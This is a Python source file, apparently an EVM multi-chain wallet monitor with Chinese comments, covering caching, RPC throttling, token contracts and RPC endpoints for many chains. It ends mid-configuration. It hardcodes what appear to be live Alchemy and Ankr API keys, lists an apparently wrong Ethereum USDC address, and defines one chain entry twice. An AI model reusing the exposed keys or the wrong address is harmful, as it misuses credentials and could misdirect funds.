import os
import sys
import json
import time
import threading
import hashlib
import base64
import re
import random
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
import logging
import signal
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, deque
import asyncio
import difflib
from functools import lru_cache

# 第三方库导入
try:
    from web3 import Web3
    from eth_account import Account
    import colorama
    from colorama import Fore, Style, Back
    import requests
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("请运行 start.sh 安装依赖")
    sys.exit(1)

# 初始化colorama
colorama.init()

# 全局监控实例与信号处理，确保 Ctrl+C 随时强制退出
MONITOR_INSTANCE = None

def _global_signal_handler(signum, frame):
    try:
        print(f"\n{Fore.YELLOW}👋 收到退出信号，正在退出...{Style.RESET_ALL}")
        if MONITOR_INSTANCE is not None:
            try:
                MONITOR_INSTANCE.stop_monitoring()
                MONITOR_INSTANCE.save_state()
                MONITOR_INSTANCE.save_wallets()
            except Exception:
                pass
    finally:
        import os as _os
        code = 130 if signum == signal.SIGINT else 143
        _os._exit(code)

class SmartCache:
    """智能缓存系统 - 为所有菜单功能提供高效缓存"""
    
    def __init__(self):
        # 多级缓存配置
        self.cache_levels = {
            'memory': {'max_size': 10000, 'ttl': 300},      # 内存缓存 - 5分钟
            'session': {'max_size': 5000, 'ttl': 1800},     # 会话缓存 - 30分钟
            'persistent': {'max_size': 2000, 'ttl': 86400}  # 持久化缓存 - 24小时
        }
        
        # 缓存存储
        self.caches = {
            'memory': {},
            'session': {},
            'persistent': {}
        }
        
        # 缓存元数据
        self.cache_metadata = {
            'memory': {},
            'session': {},
            'persistent': {}
        }
        
        # 智能预热配置
        self.preload_configs = {
            'menu_data': {'level': 'session', 'priority': 1},
            'rpc_status': {'level': 'memory', 'priority': 2},
            'wallet_balances': {'level': 'memory', 'priority': 3},
            'network_info': {'level': 'persistent', 'priority': 1},
            'token_metadata': {'level': 'session', 'priority': 2},
            'user_preferences': {'level': 'persistent', 'priority': 1}
        }
        
        # 访问统计
        self.access_stats = defaultdict(lambda: {'hits': 0, 'misses': 0, 'last_access': 0})
        
        # 清理任务
        self.last_cleanup = time.time()
        self.cleanup_interval = 300  # 5分钟清理一次
        
    def get(self, key: str, category: str = 'memory', default=None):
        """智能获取缓存数据"""
        current_time = time.time()
        
        # 按优先级检查缓存层级
        for level in ['memory', 'session', 'persistent']:
            if key in self.caches[level]:
                metadata = self.cache_metadata[level].get(key, {})
                
                # 检查TTL
                if current_time - metadata.get('created', 0) < self.cache_levels[level]['ttl']:
                    # 更新访问统计
                    self.access_stats[f"{category}:{key}"]['hits'] += 1
                    self.access_stats[f"{category}:{key}"]['last_access'] = current_time
                    
                    # 智能提升：将热点数据提升到更快的缓存层
                    if level != 'memory' and self.access_stats[f"{category}:{key}"]['hits'] > 5:
                        self.set(key, self.caches[level][key], 'memory')
                    
                    return self.caches[level][key]
                else:
                    # 过期删除
                    self._remove_from_level(key, level)
        
        # 缓存未命中
        self.access_stats[f"{category}:{key}"]['misses'] += 1
        return default
    
    def set(self, key: str, value, level: str = 'memory', category: str = 'general'):
        """智能设置缓存数据"""
        current_time = time.time()
        
        # 检查缓存大小限制
        if len(self.caches[level]) >= self.cache_levels[level]['max_size']:
            self._evict_lru(level)
        
        # 存储数据
        self.caches[level][key] = value
        self.cache_metadata[level][key] = {
            'created': current_time,
            'category': category,
            'access_count': 1,
            'size': len(str(value)) if isinstance(value, (str, dict, list)) else 1
        }
        
        # 定期清理
        if current_time - self.last_cleanup > self.cleanup_interval:
            self._cleanup_expired()
    
    def preload(self, data_loader, key: str, category: str):
        """智能预加载数据"""
        config = self.preload_configs.get(category, {'level': 'memory', 'priority': 3})
        
        # 检查是否需要预加载
        if not self.get(key, category):
            try:
                data = data_loader()
                self.set(key, data, config['level'], category)
                return True
            except Exception as e:
                print(f"预加载失败 {key}: {e}")
                return False
        return True
    
    def invalidate(self, key: str = None, category: str = None):
        """智能失效缓存"""
        if key:
            # 删除特定键
            for level in self.caches:
                self._remove_from_level(key, level)
        elif category:
            # 删除特定分类
            for level in self.caches:
                keys_to_remove = []
                for k, metadata in self.cache_metadata[level].items():
                    if metadata.get('category') == category:
                        keys_to_remove.append(k)
                for k in keys_to_remove:
                    self._remove_from_level(k, level)
    
    def clear_category(self, category: str):
        """清除指定分类的所有缓存"""
        self.invalidate(category=category)
    
    def _remove_from_level(self, key: str, level: str):
        """从指定层级删除缓存"""
        if key in self.caches[level]:
            del self.caches[level][key]
        if key in self.cache_metadata[level]:
            del self.cache_metadata[level][key]
    
    def _evict_lru(self, level: str):
        """LRU淘汰策略"""
        if not self.cache_metadata[level]:
            return
        
        # 找到最少使用的项
        lru_key = min(
            self.cache_metadata[level].keys(),
            key=lambda k: self.cache_metadata[level][k].get('created', 0)
        )
        self._remove_from_level(lru_key, level)
    
    def _cleanup_expired(self):
        """清理过期缓存"""
        current_time = time.time()
        self.last_cleanup = current_time
        
        for level in self.caches:
            ttl = self.cache_levels[level]['ttl']
            expired_keys = []
            
            for key, metadata in self.cache_metadata[level].items():
                if current_time - metadata.get('created', 0) > ttl:
                    expired_keys.append(key)
            
            for key in expired_keys:
                self._remove_from_level(key, level)
    
    def get_stats(self):
        """获取缓存统计"""
        stats = {
            'cache_sizes': {level: len(cache) for level, cache in self.caches.items()},
            'hit_rates': {},
            'total_size': sum(len(cache) for cache in self.caches.values())
        }
        
        for key, stat in self.access_stats.items():
            total_requests = stat['hits'] + stat['misses']
            if total_requests > 0:
                stats['hit_rates'][key] = stat['hits'] / total_requests
        
        return stats


class SmartThrottler:
    """智能调速控制器 - 根据网络情况自动调整并发和频率"""
    
    def __init__(self):
        # API调用限制配置
        self.api_limits = {
            'ankr': {
                'daily_limit': 5000,
                'calls_today': 0,
                'reset_time': datetime.now() + timedelta(days=1),
                'min_interval': 0.1,  # 最小调用间隔(秒)
                'priority': 3  # 优先级: 1=最高, 5=最低
            },
            'alchemy': {
                'daily_limit': 1000000,
                'calls_today': 0,
                'reset_time': datetime.now() + timedelta(days=1),
                'min_interval': 0.001,
                'priority': 1
            },
            'public': {
                'daily_limit': float('inf'),
                'calls_today': 0,
                'reset_time': datetime.now() + timedelta(days=1),
                'min_interval': 0.05,
                'priority': 2
            }
        }
        
        # 网络性能监控
        self.rpc_stats = defaultdict(lambda: {
            'success_rate': 1.0,
            'avg_response_time': 0.5,
            'recent_errors': deque(maxlen=20),
            'total_calls': 0,
            'successful_calls': 0,
            'last_call_time': 0,
            'consecutive_errors': 0,
            'health_score': 1.0,
            'api_type': 'public'  # 'public', 'alchemy', 'ankr'
        })
        
        # 自适应并发控制
        self.adaptive_config = {
            'min_workers': 5,  # 最低线程数提升到5
            'max_workers': 50,
            'current_workers': 10,  # 初始线程数提升
            'error_threshold': 0.1,  # 错误率阈值
            'response_time_threshold': 2.0,  # 响应时间阈值
            'adjustment_interval': 15,  # 调整间隔缩短为15秒，更快响应
            'last_adjustment': time.time(),
            'auto_optimization': True  # 全自动优化标志
        }
        
        # 请求队列和优先级
        self.request_queue = {
            'high': deque(),    # 高优先级: 转账等关键操作
            'medium': deque(),  # 中优先级: 余额查询
            'low': deque()      # 低优先级: 扫描操作
        }
        
        self.lock = threading.Lock()
        
    def classify_rpc_type(self, rpc_url: str) -> str:
        """分类RPC类型"""
        url_lower = rpc_url.lower()
        if 'alchemy' in url_lower:
            return 'alchemy'
        elif 'ankr' in url_lower:
            return 'ankr'
        else:
            return 'public'
    
    def can_make_request(self, rpc_url: str) -> bool:
        """检查是否可以发起请求"""
        api_type = self.classify_rpc_type(rpc_url)
        
        with self.lock:
            # 检查日常限制
            limit_info = self.api_limits[api_type]
            if limit_info['calls_today'] >= limit_info['daily_limit']:
                return False
            
            # 检查时间间隔
            rpc_info = self.rpc_stats[rpc_url]
            current_time = time.time()
            time_since_last = current_time - rpc_info['last_call_time']
            
            if time_since_last < limit_info['min_interval']:
                return False
                
            # 检查健康状态
            if rpc_info['health_score'] < 0.3:  # 健康度过低
                return False
                
            return True
    
    def record_request(self, rpc_url: str, success: bool, response_time: float, error: str = None):
        """记录请求结果"""
        api_type = self.classify_rpc_type(rpc_url)
        
        with self.lock:
            # 更新API调用计数
            self.api_limits[api_type]['calls_today'] += 1
            
            # 更新RPC统计
            rpc_info = self.rpc_stats[rpc_url]
            rpc_info['total_calls'] += 1
            rpc_info['last_call_time'] = time.time()
            rpc_info['api_type'] = api_type
            
            if success:
                rpc_info['successful_calls'] += 1
                rpc_info['consecutive_errors'] = 0
            else:
                rpc_info['consecutive_errors'] += 1
                rpc_info['recent_errors'].append({
                    'time': time.time(),
                    'error': error or 'Unknown error'
                })
            
            # 更新成功率
            rpc_info['success_rate'] = rpc_info['successful_calls'] / rpc_info['total_calls']
            
            # 更新平均响应时间
            if response_time > 0:
                alpha = 0.3  # 平滑因子
                rpc_info['avg_response_time'] = (
                    alpha * response_time + (1 - alpha) * rpc_info['avg_response_time']
                )
            
            # 计算健康分数 (0-1)
            self._calculate_health_score(rpc_url)
    
    def _calculate_health_score(self, rpc_url: str):
        """计算RPC健康分数"""
        rpc_info = self.rpc_stats[rpc_url]
        
        # 成功率权重: 0.5
        success_weight = rpc_info['success_rate'] * 0.5
        
        # 响应时间权重: 0.3 (响应时间越快分数越高)
        response_score = max(0, 1 - (rpc_info['avg_response_time'] / 3.0))
        response_weight = response_score * 0.3
        
        # 连续错误惩罚: 0.2
        error_penalty = max(0, 1 - (rpc_info['consecutive_errors'] / 5.0))
        error_weight = error_penalty * 0.2
        
        rpc_info['health_score'] = success_weight + response_weight + error_weight
    
    def get_optimal_worker_count(self) -> int:
        """获取最优工作线程数"""
        current_time = time.time()
        
        # 检查是否需要调整
        if current_time - self.adaptive_config['last_adjustment'] < self.adaptive_config['adjustment_interval']:
            return self.adaptive_config['current_workers']
        
        with self.lock:
            # 计算整体网络健康状况
            total_health = 0
            total_rpcs = 0
            avg_error_rate = 0
            avg_response_time = 0
            
            for rpc_url, stats in self.rpc_stats.items():
                if stats['total_calls'] > 0:
                    total_health += stats['health_score']
                    avg_error_rate += (1 - stats['success_rate'])
                    avg_response_time += stats['avg_response_time']
                    total_rpcs += 1
            
            if total_rpcs == 0:
                return self.adaptive_config['current_workers']
            
            avg_health = total_health / total_rpcs
            avg_error_rate /= total_rpcs
            avg_response_time /= total_rpcs
            
            current_workers = self.adaptive_config['current_workers']
            
            # 调整策略
            if avg_error_rate > self.adaptive_config['error_threshold']:
                # 错误率高，减少并发
                new_workers = max(self.adaptive_config['min_workers'], current_workers - 2)
            elif avg_response_time > self.adaptive_config['response_time_threshold']:
                # 响应时间长，减少并发
                new_workers = max(self.adaptive_config['min_workers'], current_workers - 1)
            elif avg_health > 0.8 and avg_error_rate < 0.05:
                # 网络状况良好，增加并发
                new_workers = min(self.adaptive_config['max_workers'], current_workers + 1)
            else:
                new_workers = current_workers
            
            self.adaptive_config['current_workers'] = new_workers
            self.adaptive_config['last_adjustment'] = current_time
            
            return new_workers
    
    def get_best_rpcs(self, rpc_urls: List[str], count: int = 3) -> List[str]:
        """获取最佳的RPC列表"""
        # 按健康分数和API优先级排序
        rpc_scores = []
        
        for rpc_url in rpc_urls:
            if not self.can_make_request(rpc_url):
                continue
                
            rpc_info = self.rpc_stats[rpc_url]
            api_type = self.classify_rpc_type(rpc_url)
            api_priority = self.api_limits[api_type]['priority']
            
            # 综合评分: 健康分数 + API优先级加权
            score = rpc_info['health_score'] + (6 - api_priority) * 0.1
            
            rpc_scores.append((rpc_url, score))
        
        # 按分数降序排序
        rpc_scores.sort(key=lambda x: x[1], reverse=True)
        
        return [rpc_url for rpc_url, _ in rpc_scores[:count]]
    
    def reset_daily_limits(self):
        """重置日常限制"""
        current_time = datetime.now()
        
        with self.lock:
            for api_type, limits in self.api_limits.items():
                if current_time >= limits['reset_time']:
                    limits['calls_today'] = 0
                    limits['reset_time'] = current_time + timedelta(days=1)
    
    def get_stats_summary(self) -> dict:
        """获取统计摘要"""
        with self.lock:
            return {
                'api_usage': {k: v['calls_today'] for k, v in self.api_limits.items()},
                'current_workers': self.adaptive_config['current_workers'],
                'healthy_rpcs': sum(1 for stats in self.rpc_stats.values() if stats['health_score'] > 0.7),
                'total_rpcs': len(self.rpc_stats),
                'avg_health': sum(stats['health_score'] for stats in self.rpc_stats.values()) / max(len(self.rpc_stats), 1)
            }

class EVMMonitor:
    def __init__(self):
        # 配置
        self.ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
        self.ANKR_API_KEY = "f3e8c3210c23fbe769ac9bb8b0a4eced8b67ec0e1e51f0497c92a648f821bb50"
        
        # ERC20 代币 ABI（标准接口）
        self.erc20_abi = [
            {
                "constant": True,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": False,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": True,
                "inputs": [],
                "name": "decimals",
                "outputs": [{"name": "", "type": "uint8"}],
                "type": "function"
            },
            {
                "constant": True,
                "inputs": [],
                "name": "symbol",
                "outputs": [{"name": "", "type": "string"}],
                "type": "function"
            },
            {
                "constant": True,
                "inputs": [],
                "name": "name",
                "outputs": [{"name": "", "type": "string"}],
                "type": "function"
            }
        ]
        
        # 支持的代币配置
        self.tokens = {
            # 主流稳定币
            'USDT': {
                'name': 'Tether USD',
                'symbol': 'USDT',
                'contracts': {
                    'ethereum': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                    'arbitrum': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                    'optimism': '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                    'polygon': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                    'base': '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2'
                }
            },
            'USDC': {
                'name': 'USD Coin',
                'symbol': 'USDC',
                'contracts': {
                    'ethereum': '0xA0b86a33E6417aFD5BF27c23E2a7B0b9bE6C1e67',
                    'arbitrum': '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
                    'optimism': '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
                    'polygon': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                    'base': '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'
                }
            },
            'DAI': {
                'name': 'Dai Stablecoin',
                'symbol': 'DAI',
                'contracts': {
                    'ethereum': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                    'arbitrum': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
                    'optimism': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
                    'polygon': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063'
                }
            }
        }
        
        # 支持的全链网络配置（Alchemy + 公共RPC）
        self.networks = {
            # ==== 🌐 LAYER 1 主网 (按首字母排序) ====
            'astar': {
                'name': '🌟 Astar',
                'chain_id': 592,
                'rpc_urls': [
                    'https://evm.astar.network',
                    'https://astar.publicnode.com',
                    'https://rpc.ankr.com/astar',
                    'https://astar.llamarpc.com'
                ],
                'native_currency': 'ASTR',
                'explorer': 'https://blockscout.com/astar'
            },
            
            'aurora': {
                'name': '🌌 Aurora',
                'chain_id': 1313161554,
                'rpc_urls': [
                    'https://mainnet.aurora.dev',
                    'https://aurora.publicnode.com',
                    'https://rpc.ankr.com/aurora',
                    'https://aurora.llamarpc.com'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://aurorascan.dev'
            },
            
            'avalanche': {
                'name': '🏔️ Avalanche C-Chain',
                'chain_id': 43114,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://avalanche.public-rpc.com',
                    'https://api.avax.network/ext/bc/C/rpc',
                    'https://avalanche.blockpi.network/v1/rpc/public',
                    'https://avax.meowrpc.com',
                    'https://avalanche.drpc.org',
                    'https://endpoints.omniatech.io/v1/avax/mainnet/public',
                    'https://1rpc.io/avax/c',
                    'https://avax-rpc.gateway.pokt.network',
                    # Ankr (备用)
                    f'https://rpc.ankr.com/avalanche/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'AVAX',
                'explorer': 'https://snowtrace.io'
            },
            
            'bsc': {
                'name': '🟡 BNB Smart Chain',
                'chain_id': 56,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://bsc.publicnode.com',
                    'https://bsc-dataseed1.binance.org',
                    'https://bsc-dataseed2.binance.org',
                    'https://bsc-dataseed3.binance.org',
                    'https://bsc.blockpi.network/v1/rpc/public',
                    'https://bsc.drpc.org',
                    'https://endpoints.omniatech.io/v1/bsc/mainnet/public',
                    'https://bsc-rpc.gateway.pokt.network',
                    # Ankr (备用)
                    f'https://rpc.ankr.com/bsc/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'BNB',
                'explorer': 'https://bscscan.com'
            },
            
            'celo': {
                'name': '🌿 Celo',
                'chain_id': 42220,
                'rpc_urls': [
                    'https://forno.celo.org',
                    'https://celo.publicnode.com',
                    'https://rpc.ankr.com/celo',
                    'https://celo.llamarpc.com'
                ],
                'native_currency': 'CELO',
                'explorer': 'https://celoscan.io'
            },
            
            'chiliz': {
                'name': '🌶️ Chiliz',
                'chain_id': 88888,
                'rpc_urls': [
                    'https://rpc.ankr.com/chiliz',
                    'https://chiliz.publicnode.com'
                ],
                'native_currency': 'CHZ',
                'explorer': 'https://scan.chiliz.com'
            },
            
            'cronos': {
                'name': '🦀 Cronos',
                'chain_id': 25,
                'rpc_urls': [
                    # 公共节点
                    'https://cronos.publicnode.com',
                    'https://evm.cronos.org',
                    'https://cronos.blockpi.network/v1/rpc/public',
                    'https://cronos.drpc.org',
                    'https://cronos-evm.publicnode.com',
                    'https://rpc.vvs.finance',
                    # Alchemy
                    f'https://cronos-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr
                    f'https://rpc.ankr.com/cronos/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'CRO',
                'explorer': 'https://cronoscan.com'
            },
            
            'core': {
                'name': '⚡ Core',
                'chain_id': 1116,
                'rpc_urls': [
                    'https://rpc.coredao.org',
                    'https://rpc-core.icecreamswap.com'
                ],
                'native_currency': 'CORE',
                'explorer': 'https://scan.coredao.org'
            },
            
            'ethereum': {
                'name': '🔷 Ethereum Mainnet',
                'chain_id': 1,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://ethereum.publicnode.com',
                    'https://ethereum.blockpi.network/v1/rpc/public',
                    'https://rpc.mevblocker.io',
                    'https://virginia.rpc.blxrbdn.com',
                    'https://uk.rpc.blxrbdn.com',
                    'https://singapore.rpc.blxrbdn.com',
                    'https://eth.drpc.org',
                    'https://endpoints.omniatech.io/v1/eth/mainnet/public',
                    # ALCHEMY (备用)
                    f'https://eth-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/eth/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://etherscan.io'
            },
            
            'evmos': {
                'name': '🌌 Evmos',
                'chain_id': 9001,
                'rpc_urls': [
                    'https://evmos-evm.publicnode.com',
                    'https://evmos.lava.build',
                    'https://rpc.ankr.com/evmos',
                    'https://evmos.llamarpc.com'
                ],
                'native_currency': 'EVMOS',
                'explorer': 'https://escan.live'
            },
            
            'fantom': {
                'name': '👻 Fantom Opera',
                'chain_id': 250,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://fantom.publicnode.com',
                    'https://rpc.ftm.tools',
                    'https://fantom.blockpi.network/v1/rpc/public',
                    'https://rpc.fantom.network',
                    'https://fantom.drpc.org',
                    'https://endpoints.omniatech.io/v1/fantom/mainnet/public',
                    'https://1rpc.io/ftm',
                    'https://rpc2.fantom.network',
                    'https://rpc3.fantom.network',
                    # Ankr (备用)
                    f'https://rpc.ankr.com/fantom/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'FTM',
                'explorer': 'https://ftmscan.com'
            },
            
            'filecoin': {
                'name': '💾 Filecoin',
                'chain_id': 314,
                'rpc_urls': [
                    'https://api.node.glif.io/rpc/v1',
                    'https://rpc.ankr.com/filecoin'
                ],
                'native_currency': 'FIL',
                'explorer': 'https://filfox.info'
            },
            
            'fuse': {
                'name': '⚡ Fuse',
                'chain_id': 122,
                'rpc_urls': [
                    'https://rpc.fuse.io',
                    'https://fuse.publicnode.com',
                    'https://rpc.ankr.com/fuse',
                    'https://fuse.llamarpc.com'
                ],
                'native_currency': 'FUSE',
                'explorer': 'https://explorer.fuse.io'
            },
            
            'gnosis': {
                'name': '🦉 Gnosis Chain',
                'chain_id': 100,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://gnosis.publicnode.com',
                    'https://rpc.gnosischain.com',
                    'https://gnosis.blockpi.network/v1/rpc/public',
                    'https://gnosis.drpc.org',
                    'https://endpoints.omniatech.io/v1/gnosis/mainnet/public',
                    'https://1rpc.io/gnosis',
                    'https://gnosis-mainnet.public.blastapi.io',
                    'https://rpc.gnosis.gateway.fm',
                    # Ankr (备用)
                    f'https://rpc.ankr.com/gnosis/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'xDAI',
                'explorer': 'https://gnosisscan.io'
            },
            
            'harmony': {
                'name': '🎵 Harmony',
                'chain_id': 1666600000,
                'rpc_urls': [
                    'https://api.harmony.one',
                    'https://harmony.publicnode.com',
                    'https://rpc.ankr.com/harmony',
                    'https://harmony.llamarpc.com'
                ],
                'native_currency': 'ONE',
                'explorer': 'https://explorer.harmony.one'
            },
            
            # 'heco': {  # ❌ 禁用：所有RPC节点失效（2024-12检测）
            #     'name': '🔥 Huobi ECO Chain',
            #     'chain_id': 128,
            #     'rpc_urls': [
            #         'https://http-mainnet.hecochain.com',  # 连接失败
            #         'https://http-mainnet-node.huobichain.com',  # 连接失败
            #         'https://hecoapi.terminet.io/rpc',  # 连接失败
            #         'https://heco.drpc.org'  # HTTP 400
            #     ],
            #     'native_currency': 'HT',
            #     'explorer': 'https://hecoinfo.com'
            # },
            
            'kava': {
                'name': '🌋 Kava EVM',
                'chain_id': 2222,
                'rpc_urls': [
                    'https://evm.kava.io',
                    'https://evm2.kava.io',
                    'https://kava-evm.publicnode.com',
                    'https://kava.publicnode.com',
                    'https://rpc.ankr.com/kava',
                    'https://kava.llamarpc.com'
                ],
                'native_currency': 'KAVA',
                'explorer': 'https://kavascan.com'
            },
            
            'klaytn': {
                'name': '🔗 Klaytn',
                'chain_id': 8217,
                'rpc_urls': [
                    'https://public-node-api.klaytnapi.com/v1/cypress',
                    'https://klaytn.publicnode.com',
                    'https://rpc.ankr.com/klaytn',
                    'https://klaytn.llamarpc.com'
                ],
                'native_currency': 'KLAY',
                'explorer': 'https://scope.klaytn.com'
            },
            
            # 'mantra': {  # ❌ 禁用：不支持标准EVM eth_chainId方法（2024-12检测）
            #     'name': '🕉️ MANTRA',
            #     'chain_id': 3370,
            #     'rpc_urls': [
            #         'https://rpc.mantrachain.io',  # Method not found
            #         'https://evm-rpc.mantrachain.io'  # 连接失败
            #     ],
            #     'native_currency': 'OM',
            #     'explorer': 'https://explorer.mantrachain.io'
            # },
            
            'moonbeam': {
                'name': '🌙 Moonbeam',
                'chain_id': 1284,
                'rpc_urls': [
                    'https://rpc.api.moonbeam.network',
                    'https://moonbeam.publicnode.com',
                    'https://rpc.ankr.com/moonbeam',
                    'https://moonbeam.llamarpc.com'
                ],
                'native_currency': 'GLMR',
                'explorer': 'https://moonscan.io'
            },
            
            'moonriver': {
                'name': '🌊 Moonriver',
                'chain_id': 1285,
                'rpc_urls': [
                    'https://rpc.api.moonriver.moonbeam.network',
                    'https://moonriver.publicnode.com',
                    'https://rpc.ankr.com/moonriver',
                    'https://moonriver.llamarpc.com'
                ],
                'native_currency': 'MOVR',
                'explorer': 'https://moonriver.moonscan.io'
            },
            
            'okx': {
                'name': '🅾️ OKX Chain',
                'chain_id': 66,
                'rpc_urls': [
                    'https://exchainrpc.okex.org',
                    'https://okx.publicnode.com',
                    'https://rpc.ankr.com/okx',
                    'https://okx.llamarpc.com'
                ],
                'native_currency': 'OKT',
                'explorer': 'https://www.oklink.com/okc'
            },
            
            'polygon': {
                'name': '🟣 Polygon PoS',
                'chain_id': 137,
                'rpc_urls': [
                    # 公共节点
                    'https://polygon.publicnode.com',
                    'https://polygon-rpc.com',
                    'https://polygon.blockpi.network/v1/rpc/public',
                    'https://polygon.llamarpc.com',
                    'https://polygon.drpc.org',
                    'https://endpoints.omniatech.io/v1/matic/mainnet/public',
                    'https://1rpc.io/matic',
                    # Alchemy
                    f'https://polygon-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr
                    f'https://rpc.ankr.com/polygon/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'POL',
                'explorer': 'https://polygonscan.com'
            },
            
            'shiden': {
                'name': '🗾 Shiden',
                'chain_id': 336,
                'rpc_urls': [
                    'https://rpc.shiden.astar.network:8545',
                    'https://shiden.public.blastapi.io',
                    'https://shiden-rpc.dwellir.com',
                    'https://shiden.api.onfinality.io/public',
                    'https://shiden.public.curie.radiumblock.co/http',
                    f'https://rpc.ankr.com/shiden/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'SDN',
                'explorer': 'https://shiden.subscan.io'
            },
            
            'telos': {
                'name': '🌐 Telos EVM',
                'chain_id': 40,
                'rpc_urls': [
                    'https://mainnet.telos.net/evm',
                    'https://telos.publicnode.com',
                    'https://rpc.ankr.com/telos',
                    'https://telos.llamarpc.com'
                ],
                'native_currency': 'TLOS',
                'explorer': 'https://teloscan.io'
            },
            
            'zetachain': {
                'name': '⚡ ZetaChain',
                'chain_id': 7000,
                'rpc_urls': [
                    'https://zetachain-evm.blockpi.network/v1/rpc/public',
                    'https://zetachain-mainnet-archive.allthatnode.com:8545'
                ],
                'native_currency': 'ZETA',
                'explorer': 'https://zetachain.blockscout.com'
            },
            
            # ==== 💎 新增重要主网链条 ====
            
            'eos_evm': {
                'name': '🟡 EOS EVM',
                'chain_id': 17777,  # ✅ 测试确认
                'rpc_urls': [
                    'https://api.evm.eosnetwork.com'  # ✅ 测试可用
                ],
                'native_currency': 'EOS',
                'explorer': 'https://explorer.evm.eosnetwork.com'
            },
            
            'gochain': {
                'name': '🟢 GoChain',
                'chain_id': 60,  # ✅ 测试确认
                'rpc_urls': [
                    'https://rpc.gochain.io'  # ✅ 测试可用
                ],
                'native_currency': 'GO',
                'explorer': 'https://explorer.gochain.io'
            },
            
            'elastos': {
                'name': '🔗 Elastos EVM',
                'chain_id': 20,  # ✅ 测试确认
                'rpc_urls': [
                    'https://api.elastos.io/eth'  # ✅ 测试可用
                ],
                'native_currency': 'ELA',
                'explorer': 'https://eth.elastos.io'
            },
            
            'wemix': {
                'name': '🎮 WEMIX',
                'chain_id': 1111,  # ✅ 测试确认
                'rpc_urls': [
                    'https://api.wemix.com',  # ✅ 测试可用
                    'https://wemix.drpc.org'  # ✅ 测试可用
                ],
                'native_currency': 'WEMIX',
                'explorer': 'https://explorer.wemix.com'
            },
            
            'skale': {
                'name': '⚙️ Skale Europa',
                'chain_id': 1564830818,  # ✅ 更新正确链ID
                'rpc_urls': [
                    'https://mainnet.skalenodes.com/v1/elated-tan-skat'  # ✅ 测试可用
                ],
                'native_currency': 'SKL',
                'explorer': 'https://elated-tan-skat.explorer.mainnet.skalenodes.com'
            },
            
            'berachain': {
                'name': '🐻 Berachain',
                'chain_id': 80094,  # 修正：正确的Berachain主网ID
                'rpc_urls': [
                    'https://rpc.berachain.com',
                    'https://berachain-rpc.publicnode.com',
                    'https://berachain.drpc.org',
                    'https://rpc.berachain-apis.com',
                    'https://berachain.therpc.io',
                    # Alchemy (付费)
                    f'https://berachain-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}'
                ],
                'native_currency': 'BERA',
                'explorer': 'https://berascan.com'
            },
            
            'bitgert': {
                'name': '⚡ Bitgert',
                'chain_id': 32520,
                'rpc_urls': [
                    'https://rpc-bitgert.icecreamswap.com',  # ✅ 测试可用
                    'https://rpc-1.chainrpc.com',
                    'https://rpc-2.chainrpc.com', 
                    'https://serverrpc.com',
                    # Ankr (付费)
                    f'https://rpc.ankr.com/bitgert/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'BRISE',
                'explorer': 'https://brisescan.com'
            },
            
            'canto': {
                'name': '💫 Canto',
                'chain_id': 7700,
                'rpc_urls': [
                    'https://canto-rpc.ansybl.io',  # ✅ 2024测试可用
                    'https://canto.gravitychain.io',  # 备用
                    'https://canto.evm.chandrastation.com',  # 备用
                    'https://mainnode.plexnode.org:8545'  # 备用
                ],
                'native_currency': 'CANTO',
                'explorer': 'https://cantoscan.com'
            },
            
            'dogechain': {
                'name': '🐕 Dogechain',
                'chain_id': 2000,
                'rpc_urls': [
                    'https://rpc.dogechain.dog',
                    'https://rpc01.dogechain.dog',
                    'https://rpc02.dogechain.dog'
                ],
                'native_currency': 'DOGE',
                'explorer': 'https://explorer.dogechain.dog'
            },
            
            'ethereum_classic': {
                'name': '🟢 Ethereum Classic',
                'chain_id': 61,
                'rpc_urls': [
                    'https://etc.rivet.link',
                    'https://besu-de.etc-network.info',
                    'https://geth-de.etc-network.info'
                ],
                'native_currency': 'ETC',
                'explorer': 'https://blockscout.com/etc/mainnet'
            },
            
            'eos_evm': {
                'name': '🟡 EOS EVM',
                'chain_id': 17777,
                'rpc_urls': [
                    'https://api.evm.eosnetwork.com',
                    'https://eosevm.blockpi.network/v1/rpc/public',
